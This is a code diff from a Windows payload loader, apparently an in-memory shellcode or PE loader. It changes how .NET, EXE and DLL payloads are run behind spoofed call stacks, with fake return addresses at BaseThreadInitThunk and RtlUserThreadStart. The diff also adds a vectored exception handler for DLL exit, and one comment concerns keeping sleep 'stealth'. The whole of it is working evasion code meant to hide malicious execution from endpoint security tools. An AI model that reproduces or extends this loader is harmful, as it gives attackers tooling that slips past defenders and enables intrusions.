@@ -712,8 +712,6 @@ int Loader(INSTANCE* inst)
     PRM ogp = { 0 };
     NTSTATUS status = STATUS_SUCCESS;
 
-    p.trampoline = FindGadget((LPBYTE)moduleKernel32, 0x200000, (char*)inst->sGadget);
-
     ReturnAddress = (PBYTE)(inst->api.GetProcAddress(moduleKernel32, (char*)inst->sBaseThreadInitThunk)) + 0x14; // Would walk export table but am lazy
     p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
     p.BTIT_retaddr = ReturnAddress;
@@ -721,8 +719,6 @@ int Loader(INSTANCE* inst)
     ReturnAddress = (PBYTE)(inst->api.GetProcAddress(inst->api.GetModuleHandleA(inst->sNtDLL), (char*)inst->sRtlUserThreadStart)) + 0x21;
     p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, ReturnAddress);
     p.RUTS_retaddr = ReturnAddress;
-
-    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(inst, p.trampoline);
     
     //
     // DotNet
@@ -822,7 +818,7 @@ int Loader(INSTANCE* inst)
             // __debugbreak();
             Spoof(NULL, NULL, NULL, NULL, &p, module->exeEntry, (PVOID)0);
 
-            HandleExitBehavior();
+            // we never come back here
 
             return 0;
         }
@@ -857,8 +853,12 @@ int Loader(INSTANCE* inst)
 
             // __debugbreak();
 
-            // TODO Handle exit of the DLL by putting a VEH on the return of the DLL function ?
+            InstallExitVEH(inst);
+
+            // SpoofDllReturn in test.asm routes the export's return into AfterDllContinuation.
             Spoof(NULL, NULL, NULL, NULL, &p, func, (PVOID)0);
+
+            // we never come back here
             
             return 0;
         }
@@ -1696,6 +1696,7 @@ static DWORD HandleExitBehavior(void)
     printf("mode %u\n", mode);
 #endif
 
+    // TODO sleep is not stealth , find a way, maybe call spoof again ?
     if (mode == 3) {
         for (;;) {
             MM_Sleep(inst, 1000);
@@ -1714,6 +1715,11 @@ static DWORD HandleExitBehavior(void)
 static DWORD WINAPI AfterExeContinuation(LPVOID parameter)
 {
     (void)parameter;
+    return HandleExitBehavior();
+}
+
+DWORD WINAPI AfterDllContinuation(void)
+{
     return HandleExitBehavior();
 }
 
